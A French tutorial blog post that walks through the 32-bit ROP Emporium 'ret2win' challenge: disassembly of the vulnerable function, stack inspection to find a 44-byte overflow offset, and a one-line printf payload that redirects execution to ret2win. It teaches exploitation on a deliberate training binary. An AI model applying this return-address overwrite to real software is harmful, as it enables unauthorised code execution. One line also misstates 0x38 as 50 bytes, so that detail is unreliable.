---
Title: Ropemporium x86_32 ret2win
Date: 2023-06-11
Tags: [linux, python, ROP, x86_32, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
---

# ret2win

## Introduction.

Cette article démarre une série consacrée à la résolution des challenges [ropemporium](https://ropemporium.com/challenge/ret2win.html).
Avec la version X86 donc 32 bits.

Pour rappel, l'execution de cette série nécessite l'installation des librairies 32 bits.

    sudo apt install libc6-i386


## Découverte.

Le programme a le même comportement que le programme x86_64.


    ret2win# ./ret2win32
    ret2win by ROP Emporium
    x86

    For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
    What could possibly go wrong?
    You there, may I have your input please? And don't worry about null bytes, we're using read()!

    > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Thank you!

    Exiting



## Analyse.

### Indentification de l'offset de débordement

Regardons la fonction vulnérable.

``` assembly
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x080485ad <+0>:	push   ebp
   0x080485ae <+1>:	mov    ebp,esp
   0x080485b0 <+3>:	sub    esp,0x28
   0x080485b3 <+6>:	sub    esp,0x4
   0x080485b6 <+9>:	push   0x20
   0x080485b8 <+11>:	push   0x0
   0x080485ba <+13>:	lea    eax,[ebp-0x28]
   0x080485bd <+16>:	push   eax
   0x080485be <+17>:	call   0x8048410 <memset@plt>
   0x080485c3 <+22>:	add    esp,0x10
   0x080485c6 <+25>:	sub    esp,0xc
   0x080485c9 <+28>:	push   0x8048708
   0x080485ce <+33>:	call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:	add    esp,0x10
   0x080485d6 <+41>:	sub    esp,0xc
   0x080485d9 <+44>:	push   0x8048768
   0x080485de <+49>:	call   0x80483d0 <puts@plt>
   0x080485e3 <+54>:	add    esp,0x10
   0x080485e6 <+57>:	sub    esp,0xc
   0x080485e9 <+60>:	push   0x8048788
   0x080485ee <+65>:	call   0x80483d0 <puts@plt>
   0x080485f3 <+70>:	add    esp,0x10
   0x080485f6 <+73>:	sub    esp,0xc
   0x080485f9 <+76>:	push   0x80487e8
   0x080485fe <+81>:	call   0x80483c0 <printf@plt>
   0x08048603 <+86>:	add    esp,0x10
   0x08048606 <+89>:	sub    esp,0x4
   0x08048609 <+92>:	push   0x38
   0x0804860b <+94>:	lea    eax,[ebp-0x28]
   0x0804860e <+97>:	push   eax
   0x0804860f <+98>:	push   0x0
   0x08048611 <+100>:	call   0x80483b0 <read@plt>
   0x08048616 <+105>:	add    esp,0x10
   0x08048619 <+108>:	sub    esp,0xc
   0x0804861c <+111>:	push   0x80487eb
   0x08048621 <+116>:	call   0x80483d0 <puts@plt>
   0x08048626 <+121>:	add    esp,0x10
   0x08048629 <+124>:	nop
   0x0804862a <+125>:	leave
   0x0804862b <+126>:	ret
End of assembler dump.
```

La lecture se fait dans la sequence suivante.

    0x08048609 <+92>:	push   0x38
    0x0804860b <+94>:	lea    eax,[ebp-0x28]
    0x0804860e <+97>:	push   eax
    0x0804860f <+98>:	push   0x0
    0x08048611 <+100>:	call   0x80483b0 <read@plt>

En x86, le passage de paramètre se fait exclusivement sur la pile.
On a donc read(0, ebp-0x28, 0x38).

Le buffer des destination se trouve à $ebp - 40, on lit 50 (0x38) octets.
EN 32 bits la taille de la sauvegarde su registe EBP est de 4 octets donc on doit avoir un offset de déborde ment de 44.

    gef➤  b *pwnme+100
    Breakpoint 1 at 0x8048611


    gef➤  x/20xw $esp
    0xffc80000:	0x00000000	0xffc80010	0x00000038	0x00000004
                arg1        arg2        arg2 (size)
    0xffc80010:	0x00000000	0x00000000	0x00000000	0x00000000
                #buffer
    0xffc80020:	0x00000000	0x00000000	0x00000000	0x00000000
    0xffc80030:	0x080486f8	0x00000000	0xffc80048	0x08048590
                                        SEBP        SEIP
    0xffc80040:	0x00000001	0xffc80060	0x00000000	0xf7d6b295

ni
On evnvoie 44 caractères (avec le linefeed final)
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEE

    gef➤  x/20xw $esp
    0xff90ad40:	0x00000000	0xff90ad50	0x00000038	0x00000004
    0xff90ad50:	0x41414141	0x41414141	0x42424141	0x42424242
    0xff90ad60:	0x42424242	0x43434343	0x43434343	0x44444343
    0xff90ad70:	0x44444444	0x44444444	0x0a454545	0x08048590
                                        SEBP ecrasé SEIP encode intact
    0xff90ad80:	0x00000001	0xff90ada0	0x00000000	0xf7d86295

On localise ret2win :

    gef➤  p ret2win
    $1 = {<text variable, no debug info>} 0x804862c <ret2win>

## Exploitation

Nous pourvons obtenir le flag avec uns simple ligne de commande en bash :

prinf "%44s" A envoie le bourrage initial

Ensuite on ajoute l'adresse de ret2win inversée du fait de la convention de traitement de entier littledian des processeurs intel.

    ret2win# printf "%44s\x2c\x86\x04\x08\x00" A |./ret2win32
    ret2win by ROP Emporium
    x86

    For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
    What could possibly go wrong?
    You there, may I have your input please? And don't worry about null bytes, we're using read()!

    > Thank you!
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}
    Segmentation fault (core dumped)






